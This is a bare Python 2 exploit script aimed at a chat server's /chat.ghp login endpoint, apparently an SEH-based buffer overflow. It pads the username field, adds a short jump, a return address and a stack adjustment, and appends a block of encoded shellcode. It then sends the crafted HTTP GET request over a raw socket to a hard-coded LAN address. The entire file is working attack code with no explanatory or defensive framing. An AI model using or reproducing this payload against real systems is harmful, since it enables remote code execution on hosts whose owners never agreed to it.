#!/usr/bin/python


import socket
import struct

char = ("\xb8\x60\xcc\x83\x99\xd9\xd0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x31\x31\x42\x12\x83\xea\xfc\x03\x22\xc2\x61\x6c\x5e\x32\xe7"
"\x8f\x9e\xc3\x88\x06\x7b\xf2\x88\x7d\x08\xa5\x38\xf5\x5c\x4a"
"\xb2\x5b\x74\xd9\xb6\x73\x7b\x6a\x7c\xa2\xb2\x6b\x2d\x96\xd5"
"\xef\x2c\xcb\x35\xd1\xfe\x1e\x34\x16\xe2\xd3\x64\xcf\x68\x41"
"\x98\x64\x24\x5a\x13\x36\xa8\xda\xc0\x8f\xcb\xcb\x57\x9b\x95"
"\xcb\x56\x48\xae\x45\x40\x8d\x8b\x1c\xfb\x65\x67\x9f\x2d\xb4"
"\x88\x0c\x10\x78\x7b\x4c\x55\xbf\x64\x3b\xaf\xc3\x19\x3c\x74"
"\xb9\xc5\xc9\x6e\x19\x8d\x6a\x4a\x9b\x42\xec\x19\x97\x2f\x7a"
"\x45\xb4\xae\xaf\xfe\xc0\x3b\x4e\xd0\x40\x7f\x75\xf4\x09\xdb"
"\x14\xad\xf7\x8a\x29\xad\x57\x72\x8c\xa6\x7a\x67\xbd\xe5\x10"
"\x76\x33\x90\x57\x78\x4b\x9a\xc7\x11\x7a\x11\x88\x66\x83\xf0"
"\xec\x99\xc9\x58\x44\x32\x94\x09\xd4\x5f\x27\xe4\x1b\x66\xa4"
"\x0c\xe4\x9d\xb4\x65\xe1\xda\x72\x96\x9b\x73\x17\x98\x08\x73"
"\x32\xfb\xc3\xef\x93\x9e\x63\x95\xeb")

payload =  "A"*203
payload += "\xeb\x06\x90\x90"           
payload += "\x1e\x0e\x01\x10"           
payload += "\x81\xc4\xd8\xfe\xff\xff"   
payload += char                    
payload += "D"*193

buf = (
"GET /chat.ghp?username=" + payload + "&password=&room=1&sex=1 HTTP/1.1\r\n"
"User-Agent: Mozilla/4.0\r\n"
"Host: 192.168.1.104:80\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://192.168.1.104\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.103", 80))
s.send(buf)
print s.recv(1024)




